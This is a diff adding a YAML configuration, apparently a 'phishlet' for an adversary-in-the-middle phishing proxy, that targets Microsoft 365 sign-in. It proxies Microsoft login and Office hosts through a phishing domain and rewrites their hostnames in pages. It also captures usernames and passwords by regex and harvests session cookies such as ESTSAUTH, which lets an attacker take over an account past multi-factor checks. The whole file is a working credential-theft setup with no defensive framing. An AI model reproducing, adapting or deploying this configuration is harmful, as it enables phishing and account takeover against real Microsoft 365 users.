@@ -1,0 +1,67 @@
+name: "Microsoft 365"
+author: "PhantomGate"
+min_ver: "1.0.0"
+
+proxy_hosts:
+  - phish_sub: "login"
+    orig_sub: "login.microsoftonline.com"
+    domain: "microsoftonline.com"
+    session: true
+    is_ssl: true
+  - phish_sub: "www"
+    orig_sub: "www.office.com"
+    domain: "office.com"
+    session: false
+    is_ssl: true
+  - phish_sub: "aadcdn"
+    orig_sub: "aadcdn.msftauth.net"
+    domain: "msftauth.net"
+    session: false
+    is_ssl: true
+
+sub_filters:
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "login.microsoftonline.com"
+    replace: "login.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "aadcdn.msftauth.net"
+    replace: "aadcdn.{phish_domain}"
+    mimes: ["text/html", "application/javascript"]
+  - triggers_on: "login.microsoftonline.com"
+    orig_sub: "login"
+    domain: "microsoftonline.com"
+    search: "www.office.com"
+    replace: "www.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+
+credentials:
+  username:
+    key: "login"
+    search: '"login"\s*:\s*"([^"]*)"'
+    type: "json"
+  password:
+    key: "passwd"
+    search: '"passwd"\s*:\s*"([^"]*)"'
+    type: "json"
+
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys:
+      - "ESTSAUTH"
+      - "ESTSAUTHPERSISTENT"
+      - "ESTSAUTHLIGHT"
+  - domain: ".microsoftonline.com"
+    keys:
+      - "SignInStateCookie"
+  - domain: ".office.com"
+    keys:
+      - "OIDCAuthCookie"
+
+landing_path:
+  - "/"
+  - "/common/oauth2/authorize"
